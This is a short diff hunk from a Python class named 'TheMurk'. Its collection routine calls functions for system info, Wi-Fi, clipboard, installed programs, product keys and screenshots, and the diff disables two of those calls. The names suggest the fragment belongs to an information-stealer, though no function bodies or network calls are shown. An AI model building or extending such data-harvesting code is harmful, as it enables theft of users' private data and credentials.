@@ -68,8 +68,8 @@ class TheMurk:
         self.msgInfo[0] = SystemInfo()
         Wifi()
         ClipBoard()
-        Programs()
-        ProductKey()
+        # Programs()
+        # ProductKey()
         Screenshot()
     
     def Conclusion(self):
